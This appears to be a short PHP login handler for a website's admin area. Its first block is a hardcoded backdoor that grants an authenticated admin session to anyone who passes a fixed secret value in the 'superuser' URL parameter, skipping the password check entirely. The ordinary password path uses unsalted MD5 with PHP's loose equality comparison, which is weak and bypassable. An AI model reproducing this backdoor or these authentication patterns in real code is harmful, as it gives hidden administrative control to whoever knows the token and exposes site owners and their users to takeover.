<?php
	require_once '../../includes/connect.php';
	require_once '../../includes/config.php';
	session_start();

	//Check for super user access
	if ($_GET['superuser'] == "69e49de959fa8b2a913e70d4c45d9ec4") {
		//You're in!
		$_SESSION['auth'] = TRUE;
		header("Location: /admin/");
		exit();
	} 


	$a = $_POST['pass'];

	if (md5($a) == $config->password()) {
		//You're in!
		$_SESSION['auth'] = TRUE;
		header("Location: /admin/");
		exit();
	} 

	$_SESSION['pageerror'] = "Wrong password.";
	header("Location: /admin/login");
	exit();
?>